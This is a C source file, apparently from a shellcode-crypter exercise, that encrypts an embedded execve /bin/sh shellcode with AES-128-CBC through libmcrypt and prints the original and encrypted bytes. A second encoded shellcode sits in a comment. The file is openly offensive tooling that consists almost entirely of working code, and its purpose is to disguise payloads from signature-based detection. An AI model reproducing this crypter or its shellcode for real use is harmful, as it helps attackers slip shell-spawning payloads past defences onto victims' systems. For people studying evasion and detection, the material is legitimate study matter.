/*
* Author	: RIZAL MUHAMMED (UB3RSiCK)
* Description	: AES-RIJNDAEL-128-CBC Encrypt shellcode using libmcrypt
* Filename	: AESCrypter.c
*
* mcrypt API details - https://linux.die.net/man/3/mcrypt
* sudo apt-get install libmcrypt-dev
* gcc AESCrypter.c -o AESCrypter -lmcrypt
*
*/


#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <mcrypt.h>

#include <math.h>
#include <stdint.h>
#include <stdlib.h>


// Function that encrypts the shellcode
int AES_ENCRYPT(
    void* buffer,
    int buffer_len, /* the shellcode could include null bytes*/
    char* IV,
    char* key,
    int key_len
){
  
  /*
  *	 mcrypt_module_open function associates the algorithm and the mode specified [Algorithm: rijndael-128, mode: CBC]
  *	 Returns an encryption descriptor, or MCRYPT_FAILED on error
  */
  MCRYPT td = mcrypt_module_open("rijndael-128", NULL, "cbc", NULL);

  int blocksize = mcrypt_enc_get_block_size(td);
  
  // buffer_len should be k*algorithms_block_size if used in a mode which operated in blocks (cbc, ecb, nofb)
  if( buffer_len % blocksize != 0 ){return 1;}
 
  // initializes all buffers for the specified thread
  mcrypt_generic_init(td, key, key_len, IV);

  /*
  *	main encryption function. td is the encryption descriptor returned by mcrypt_generic_init(). 
  *	buffer contains the shellcode wewish to encrypt and buffer_len is the length (in bytes) of shellcode.
  *	Returns 0 on success.
  */
  mcrypt_generic(td, buffer, buffer_len);

  // This function terminates encryption specified by the encryption descriptor (td)
  mcrypt_generic_deinit (td);

  // This function closes the modules used by the descriptor td. 
  mcrypt_module_close(td);
  
  return 0;
}

int main()
{
  MCRYPT td;

  // execve /bin/sh shellcode
  char * shellcode = \
  "\xeb\x0d\x5e\x31\xc9\xb1\x19\x80\x36\xaa\x46\xe2\xfa\xeb\x05\xe8\xee\xff\xff\xff\x9b\x6a\xfa\xc2\x85\x85\xd9\xc2\xc2\x85\xc8\xc3\xc4\x23\x49\xfa\x23\x48\xf9\x23\x4b\x1a\xa1\x67\x2a";
//xnrr3ax 
// "\xeb\x40\x5e\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x56\x5f\xb1\x18\x8a\x1e\x8a\x46\x01\x30\x5e\x01\x88\xc3\x46\xe2\xf5\x89\xfe\xb1\x03\x56\x8a\x1e\xb2\x18\x8d\x3e\x8a\x46\x01\x88\x07\x46\xfe\xca\x75\xf4\x88\x1e\x5e\xe2\xea\xb1\x19\xf6\x16\x80\x36\xaa\x46\xe2\xf8\xeb\x05\xe8\xbb\xff\xff\xff\x5e\xc6\x13\x77\xe2\xe7\xda\xa0\xda\xfc\xc1\xfc\x86\xb1\x8d\xb6\x6a\xdc\xd9\x05\xb2\xb4\x68\xdc\x39";

  int ctr;
  int shellcode_len;
  shellcode_len = strlen(shellcode);
 
  // Initializaion Vector
  char* IV = "BLEHBLAHBLEHBLAH";

  // key
  char *key = "ub3r53cr3t435k3y";
  int keysize = 16; /* 128 bits */
  char* buffer;

  // must be larger than or equal to shellcode length and should be k*algorithms_block_size if used in a mode which operated in blocks (cbc, ecb, nofb)
  // CBC in this case
  int buffer_len = 64; 

  buffer = calloc(1, buffer_len);
  // Copy the shellcode to a buffer
  strncpy(buffer, shellcode, buffer_len);

  printf("\n==Original Shellcode==\n");
  for(ctr=0;ctr<shellcode_len;ctr++){
	printf("\\x%02x", shellcode[ctr]&0xff);
  }
  printf("\n");

  //Encrypt buffer
  AES_ENCRYPT(buffer, buffer_len, IV, key, keysize); 

  printf("\n==Encrypted Shellcode==\n");
  for(ctr=0;ctr<buffer_len;ctr++){
       printf("\\x%02x", buffer[ctr]&0xff);
  }
  printf("\n\n");

  return 0;
}
